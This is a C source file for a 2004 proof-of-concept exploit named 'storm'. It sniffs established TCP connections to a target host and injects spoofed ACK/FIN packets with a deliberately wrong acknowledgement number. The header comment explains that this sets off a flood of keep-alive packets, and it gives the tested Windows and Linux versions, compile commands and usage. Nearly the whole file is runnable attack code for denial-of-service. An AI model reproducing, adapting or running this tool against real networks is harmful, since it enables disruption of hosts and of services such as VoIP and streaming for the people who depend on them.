/*      Proof of Concept for exploiting the TCP Keep Alive implementation
*      2004/12/13
*
*      Antonio M. D. S. Fortes   - antoniofortes@inatel.br
*      Diego Prota Casati        - diego-casati@inatel.br
*      Leandro Spinola Rodrigues - leandro-rodrigues@inatel.br
*
*      Tested on:
*        Windows 98 SE
*        Windows NT Server 4.0
*        Windows 2000 Professional
*        Windows 2000 Server
*        Windows 2003 Server
*        Windows XP Professional Service Pack 1
*        Windows XP Professional Service Pack 2
*        Linux 2.4.x
*
*        Linux 2.6.x:
*          It wasnt tested but there is a probability that it will also work
*          on it.
*
*      Compile:
*        gcc -lpcap storm.c -o storm           [FreeBSD]
*        gcc -D LINUX storm.c -lpcap -o storm  [Linux]
*
*
*
*      How to use:
*        ./storm Device TargetHost [Count] [Filter]
*
*      Linux systems may need to get a copy of srtlcpy and strlcat
*      which can be downloaded from the
*      OpenBSD website (www.openbsd.org)
*
*      Example:
*        ./storm rl0 192.168.10.13 1 'dst port 80'
*
*        where [Count] stands for how many injected packets should be sent to
*        the host machine and [Filter] is the filter rules of the libpcap,
*        take a look in the tcpdump man pages for some enlightments.
*
*      Description:
*        This bug appeared during a few experimentations with the TCP/IP stack
*        after which we found out that it was not, at least it is not of our
*        knowledge, found anywhere else before. That was actually a Solaris bug
*        that resembles this one.
*
*        After an established connection, a specially crafted packet with the
*        ACK/FIN flags set, a corrected Sequency Number but with an incorrected
*        Acknowledge Number will trigger a massive flush of packages with zero
*        size and only the ACK flag set. Ethereal logs showed that the keep
*        alive state was occuring and this flow kept going for approximately 3
*        minutes and a few million packets. It was clearly observed that CPU
*        and network performance was severed decreased due to this misbehave.
*
*        Potential attacks includes  DoS and DDoS. Applications and services
*        that depends on quality of services (QoS) such as H323 applications
*        (VoIP) and video streamming will suffer dramatic performance
*        downgrade.
*
*      Thanks to:
*        Luiz Gustavo Torquato Vilela - aka "Neco" - for letting us
run few tests on his labs being such a reference
*        Everson da Silva Tavares - aka "ipfix" - for doing the Linux
compatibility
*        Rodrigo Rubira Branco - aka "BSDaemon" - for fixing some errors
*        Alex Marcio Ribeiro Nunes - aka Sefer_Zohar - for being a mentor
*        Flavio Neri Rodrigues - for giving us the basics of TCP/IP
that we needed
*
*      References:
*        RFC 793  - Transmission control protocol
*        RFC 1122 - Requirements for Internet Hosts - Communication Layers
*
*/

#ifdef LINUX
     #define _BSD_SOURCE
#endif

#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/ethernet.h>

#ifndef LINUX
     #include <net/bpf.h>
#else
     #include <bpf.h>
#endif

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <pcap.h>

u_short StormCount, StormPosition = 0;
in_addr_t TargetAddress;

// Packet list
u_short PacketCount = 0;
#define PACKETS_MAX_COUNT 32
struct tcp_packet
{
     in_addr_t Source, Destination;
     u_short SourcePort, DestinationPort;
     u_short Length;
     uint32_t Acknowledge, Sequence;
     u_short Window;
     u_char Flags;
     struct tcp_packet *NextPacket;
} *PacketList = NULL;

// Function Prototypes
in_addr_t ResolveHost(char *Host);
u_short TCPCheckSum(in_addr_t Source, in_addr_t Destination, struct
tcphdr *TCP);
struct tcp_packet *AddPacket(in_addr_t Source, in_addr_t Destination,
u_short SourcePort, u_short DestinationPort, struct tcp_packet
*Packet);
void DeletePacket(struct tcp_packet *Packet);
struct tcp_packet *FindPacket(in_addr_t Source, in_addr_t Destination,
u_short SourcePort, u_short DestinationPort);
bool SendTCP(in_addr_t Source, in_addr_t Destination, u_short
SourcePort, u_short DestinationPort, uint32_t Acknowledge, uint32_t
Sequence, u_short Window, u_short Flags);
void PCapHandler(u_char *args, const struct pcap_pkthdr *pkthdr, const
u_char *packet);

int main(int argc, void **argv)
{
     // Length of each packet to capture
     const unsigned int PACKET_CAPTURE_LENGTH = sizeof(struct
ether_header) + sizeof(struct ip) + sizeof(struct tcphdr);

     char Device[16], TargetHost[128], Filter[512];
     bpf_u_int32 NetAddress, NetMask;
     char PCapError[PCAP_ERRBUF_SIZE];
     pcap_t *Descriptor;
     char CompleteFilter[1024];
     struct bpf_program Program;
     u_char *PCapNullArgs = NULL;

     if (argc < 3)
     {
           printf("Usage: %s Device TargetHost [Count] [Filter]\n", argv[0]);
           exit(1);
     }

#ifndef LINUX
     strlcpy(Device, argv[1], sizeof(Device));
     strlcpy(TargetHost, argv[2], sizeof(TargetHost));
#else
     strncpy(Device, argv[1], sizeof(Device));
     strncpy(TargetHost, argv[2], sizeof(TargetHost));
#endif
     TargetAddress = ResolveHost(TargetHost);

     // Getting network address and mask of the interface
     if (pcap_lookupnet(Device, &NetAddress, &NetMask, PCapError) == -1)
     {
           printf("pcap_lookupnet: %s\n", PCapError);
           printf("Error looking up network address and mask to
device %s\n", Device);
           exit(1);
     }
     if (argc >= 4)
           StormCount = atoi(argv[3]);
     else
           StormCount = 0;
     if (argc >= 5)
#ifndef LINUX
           strlcpy(Filter, argv[4], sizeof(Filter));
#else
           strncpy(Filter, argv[4], sizeof(Filter));
#endif
    else
           snprintf(Filter, sizeof(Filter), "net %s mask
%d.%d.%d.%d", inet_ntoa(*((struct in_addr *) &NetAddress)), ((u_char
*) &NetMask)[0], ((u_char *) &NetMask)[1], ((u_char *) &NetMask)[2],
((u_char *) &NetMask)[3]);

     // Obtaining a descriptor to look at packets on the network
    // Putting the interface in promiscuous mode
     Descriptor = pcap_open_live(Device, PACKET_CAPTURE_LENGTH, true,
1, PCapError);;
     if (Descriptor == NULL)
     {
           printf("pcap_open_live: %s\n", PCapError);
           printf("Error obtaining a descriptor to look at packets on
the network.\n");
          exit(1);
     }

    // Creating the filter string
     snprintf(CompleteFilter, sizeof(CompleteFilter), "tcp and (%s)", Filter);
     printf("Filter: %s\n", CompleteFilter);

     // Compiling the filter
    if (pcap_compile(Descriptor, &Program, CompleteFilter, false,
NetMask) == -1)
     {
           printf("pcap_compile: %s\n", pcap_geterr(Descriptor));
           printf("Filter: %s\n", Filter);
           printf("Error compiling the filter.\n");
           exit(1);
     }

     // Set the filter to the descriptor
     if (pcap_setfilter(Descriptor, &Program) == -1)
     {
           printf("pcap_setfilter: %s\n", pcap_geterr(Descriptor));
           printf("Error setting the filter.\n");
           exit(1);
     }

     // Main loop
     printf("Looking for an established tcp connection with %s
...\n", TargetHost);
     while (StormCount == 0 || StormPosition < StormCount)
           pcap_loop(Descriptor, 1, PCapHandler, PCapNullArgs);

     // The End
     printf("Finished!!!\n");

     return 0;
}

// Get the address of the host
in_addr_t ResolveHost(char *Host)
{
     in_addr_t Address = 0;
     struct hostent *HostEntity;

     if (strstr(".", Host) != NULL)
           inet_aton(Host, (struct in_addr *) &Address);
     else
     {
           HostEntity = gethostbyname(Host);
           if (HostEntity != NULL)
                 memcpy(&Address, HostEntity->h_addr, sizeof(in_addr_t));
     }
     return Address;
}

// Calculate a TCP packet checksum
u_short TCPCheckSum(in_addr_t Source, in_addr_t Destination, struct tcphdr *TCP)
{
     int CheckSum = 0;
     ushort Length = 2 * sizeof(in_addr_t) + sizeof(struct tcphdr);
     u_char *Packet = (u_char *) malloc(Length);
     u_short Index = 0;
     u_short *Buffer = (u_short *) Packet;
     uint16_t HeaderLength = htons(sizeof(struct tcphdr));

     if (Packet != NULL)
     {
           // Filling a temporary buffer to calculate the checksum
           memcpy(&Packet[Index], &Source, sizeof(Source));
           Index += sizeof(Source);
           memcpy(&Packet[Index], &Destination, sizeof(Destination));
           Index += sizeof(Destination);
           memcpy(&Packet[Index], TCP, sizeof(struct tcphdr));
           while (Length > 1)
           {
                 CheckSum += *Buffer++;
                 Length -= 2;
           }
           CheckSum += ntohs(IPPROTO_TCP + sizeof(struct tcphdr));
           if (Length == 1)
                 CheckSum += *((u_char *) Buffer);
           CheckSum = (CheckSum >> 16) + (CheckSum & 0xffff);
           CheckSum = (~(CheckSum + (CheckSum >> 16)) & 0xffff);
           free(Packet);
     }
     return CheckSum;
}

// Add a packet to the packet list
struct tcp_packet *AddPacket(in_addr_t Source, in_addr_t Destination,
u_short SourcePort, u_short DestinationPort, struct tcp_packet
*Packet)
{
     if (Packet == NULL)
     {
           if (PacketCount == 0)
           {
                 PacketList = (struct tcp_packet *)
malloc(sizeof(struct tcp_packet));
                 PacketList->NextPacket = NULL;
                 Packet = PacketList;
                 PacketCount++;
           }
           else if (PacketCount < PACKETS_MAX_COUNT)
           {
                 Packet = PacketList;
                 while (Packet->NextPacket != NULL)
                       Packet = Packet->NextPacket;
                 Packet->NextPacket = (struct tcp_packet *)
malloc(sizeof(struct tcp_packet));
                 Packet = Packet->NextPacket;
                 Packet->NextPacket = NULL;
                 PacketCount++;
           }
           else
           {
                 Packet = PacketList;
                 while (Packet->NextPacket != NULL)
                       Packet = Packet->NextPacket;
                 Packet->NextPacket = PacketList;
                 PacketList = PacketList->NextPacket;
                 Packet->NextPacket->NextPacket = NULL;
           }
     }

     if (Packet != NULL)
     {
           Packet->Source = Source;
           Packet->Destination = Destination;
           Packet->SourcePort = SourcePort;
           Packet->DestinationPort = DestinationPort;
           Packet->Length = 0;
           Packet->Acknowledge = 0;
           Packet->Sequence = 0;
           Packet->Window = 0;
           Packet->Flags = 0;
     }
     return Packet;
}

// Delete a packet from the packet list
void DeletePacket(struct tcp_packet *Packet)
{
     struct tcp_packet *CurrentPacket = PacketList;
     if (Packet != NULL && PacketCount > 0)
     {
           // Check for the first packet of the list
           if (Packet == PacketList)
           {
                 PacketList = PacketList->NextPacket;
                 free(Packet);
                 PacketCount--;
           }
           else
           {
                 // Try to find the packet in the list
                 while (CurrentPacket->NextPacket != Packet &&
CurrentPacket->NextPacket != NULL)
                       CurrentPacket = CurrentPacket->NextPacket;
                 if (CurrentPacket->NextPacket != NULL)
                 {
                       CurrentPacket->NextPacket =
CurrentPacket->NextPacket->NextPacket;
                       free(Packet);
                       PacketCount--;
                 }
           }
     }
}

// Search a packet that matches with source and destination addresses and ports
struct tcp_packet *FindPacket(in_addr_t Source, in_addr_t Destination,
u_short SourcePort, u_short DestinationPort)
{
     struct tcp_packet *PacketFound = NULL, *Packet = PacketList;
     u_short Index;
     for (Index = 0; Index < PacketCount; Index++)
     {
           if (Source == Packet->Source && Destination ==
Packet->Destination && SourcePort == Packet->SourcePort &&
DestinationPort == Packet->DestinationPort)
           {
                 PacketFound = Packet;
                 break;
           }
           Packet = Packet->NextPacket;
     }

     return PacketFound;
}

// Send a TCP packet
bool SendTCP(in_addr_t Source, in_addr_t Destination, u_short
SourcePort, u_short DestinationPort, uint32_t Acknowledge, uint32_t
Sequence, u_short Window, u_short Flags)
{
     bool Sent = false;
     int Socket;
     struct sockaddr_in SocketAddress;
     int On = 1;
     char Packet[sizeof(struct ip) + sizeof(struct tcphdr)];
     struct ip *IP = (struct ip *) &Packet[0];
     struct tcphdr *TCP = (struct tcphdr *) &Packet[sizeof(struct ip)];

     // Try to create a raw socket
     Socket = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
     if (Socket < 0)
           return false;

     // Configure the socket
     if(setsockopt(Socket, IPPROTO_IP, IP_HDRINCL, (char *) &On,
sizeof(On)) < 0)
     {
           close(Socket);
           return false;
     }

     // Configure the socket address
     memset(&SocketAddress, 0, sizeof(SocketAddress));
#ifndef LINUX
     SocketAddress.sin_len = sizeof(Packet);
#endif
     SocketAddress.sin_family = AF_INET;
     SocketAddress.sin_port = DestinationPort;
     SocketAddress.sin_addr.s_addr = Destination;

     // Fill the packet
     memset(Packet, 0, sizeof(Packet));
     IP->ip_hl = sizeof(struct ip) >> 2;
     IP->ip_v = 4;
     IP->ip_len = sizeof(Packet);
     IP->ip_ttl = 64;
     IP->ip_p = IPPROTO_TCP;
     IP->ip_src.s_addr = Source;
     IP->ip_dst.s_addr = Destination;

     TCP->th_sport = SourcePort;
     TCP->th_dport = DestinationPort;
     TCP->th_ack = Acknowledge;
     TCP->th_seq = Sequence;
     TCP->th_off = sizeof(struct tcphdr) >> 2;
#if BYTE_ORDER == LITLE_ENDIAN
     TCP->th_off = TCP->th_off << 4;
#endif
     TCP->th_flags = Flags;
     TCP->th_win = Window;
     TCP->th_sum = TCPCheckSum(Source, Destination, TCP);

     // Try to send the packet
     Sent = sendto(Socket, Packet, sizeof(Packet), 0, (const struct
sockaddr *) &SocketAddress, sizeof(SocketAddress)) == sizeof(Packet);
     if (!Sent)
     {
           printf("Error sending packet to %s ...\n",
inet_ntoa(*((struct in_addr *) &Destination)));
     }

     close(Socket);
     return Sent;
}

// Packet Capture handler
void PCapHandler(u_char *args, const struct pcap_pkthdr *pkthdr, const
u_char *packet)
{
     struct ip *IP = (struct ip *) &packet[sizeof(struct ether_header)];
     struct tcphdr *TCP = (struct tcpheader *) &packet[sizeof(struct
ether_header) + sizeof(struct ip)];
     char Source[16], Destination[16];
     u_short Length;
     struct tcp_packet *Packet, *PreviousPacket, *TargetPacket, *ReturnPacket;
     bool DeletePackets = false, KeepAlive = false, StormSent = false;
     char PacketType[32];

#ifndef LINUX
     strlcpy(PacketType, ". . . . . .", sizeof(PacketType));

     // Getting the Source and Destination ASCII strings
     strlcpy(Source, (char *) inet_ntoa(IP->ip_src), sizeof(Source));
     strlcpy(Destination, (char *) inet_ntoa(IP->ip_dst), sizeof(Destination));
#else
     strncpy(PacketType, ". . . . . .", sizeof(PacketType));

     // Getting the Source and Destination ASCII strings
     strncpy(Source, (char *) inet_ntoa(IP->ip_src), sizeof(Source));
     strncpy(Destination, (char *) inet_ntoa(IP->ip_dst), sizeof(Destination));
#endif

     // Length of the TCP data
     Length = pkthdr->len - sizeof(struct ether_header) -
sizeof(struct ip) - (TCP->th_off << 2);

     // Search for a packet in the list, with the same source, destination,
     // source port and destination port of the packet received
     Packet = FindPacket(IP->ip_src.s_addr, IP->ip_dst.s_addr,
TCP->th_sport, TCP->th_dport);
     PreviousPacket = FindPacket(IP->ip_dst.s_addr,
IP->ip_src.s_addr, TCP->th_dport, TCP->th_sport);

     // Check for flags in an established connection
     if ((TCP->th_flags & TH_ACK) && !(TCP->th_flags & (TH_FIN | TH_RST)))
     {
           // Add the packet to the list
           Packet = AddPacket(IP->ip_src.s_addr, IP->ip_dst.s_addr,
TCP->th_sport, TCP->th_dport, Packet);

           // Fill important data in the packet added
           // The TCP header size includes the size of the TCP options
           Packet->Length = Length;
           Packet->Acknowledge = TCP->th_ack;
           Packet->Sequence = TCP->th_seq;
           Packet->Window = TCP->th_win;
           Packet->Flags = TCP->th_flags;

           if (PreviousPacket != NULL)
           {
                 // Check if the packet is a keep alive one
                 KeepAlive = (Packet->Flags == TH_ACK) &&
(Packet->Length == 0) && (PreviousPacket->Flags == TH_ACK) &&
(PreviousPacket->Length == 0);

                 // Check target address again (Possible invalid filter)
                 if (!KeepAlive && (Packet->Destination ==
TargetAddress || PreviousPacket->Destination == TargetAddress))
                 {
                       // Established connection detected
#ifndef LINUX
                       strlcpy(PacketType, "Established", sizeof(PacketType));
#else
                       strncpy(PacketType, "Established", sizeof(PacketType));
#endif

                       // Point TargetPacket to the packet that has
                       // destination matching with target address,
                       // and ReturnPacket to the other
                       if (Packet->Destination == TargetAddress)
                       {
                             TargetPacket = Packet;
                             ReturnPacket = PreviousPacket;
                       }
                       else
                       {
                            TargetPacket = PreviousPacket;
                             ReturnPacket = Packet;
                       }

                       // Send the malicious TCP packet to start the
                       // storm;
                       // The Acknowledge Number is guaranteed to
                       // be less or equal to the expected Acknowledge
                       // Number minus 1 (This is what we want! ;) )
                       StormSent = SendTCP(TargetPacket->Source,
TargetPacket->Destination, TargetPacket->SourcePort,
TargetPacket->DestinationPort, htonl(ntohl(TargetPacket->Acknowledge)
- 1), htonl(ntohl(ReturnPacket->Acknowledge) + (TargetPacket->Flags &
TH_SYN) / TH_SYN), TargetPacket->Window, TH_FIN | TH_ACK);
                 }
           }
     }
     else
     {
           DeletePackets = true;
#ifndef LINUX
           strlcpy(PacketType, "Closed.....", sizeof(PacketType));
#else
           strncpy(PacketType, "Closed.....", sizeof(PacketType));
#endif
     }

     // Print some information of the packet received
     if (!KeepAlive)
           printf("%s: [Length: %d] %s.%d %s.%d\n", PacketType,
Length, Source, ntohs(TCP->th_sport), Destination,
ntohs(TCP->th_dport));

     if (StormSent)
     {
           StormPosition++;
           printf("** STORM **: [Packet %d] Sent to %s.%d\n",
		   StormPosition, inet_ntoa(*((struct in_addr *)
		   &TargetPacket->Destination)), ntohs(TargetPacket->DestinationPort));
     }

     if (DeletePackets)
     {
           // Delete this packet (if it is in the list) and a possible
           // previous packet, in the oposite way
           DeletePacket(Packet);
           DeletePacket(PreviousPacket);
     }
}

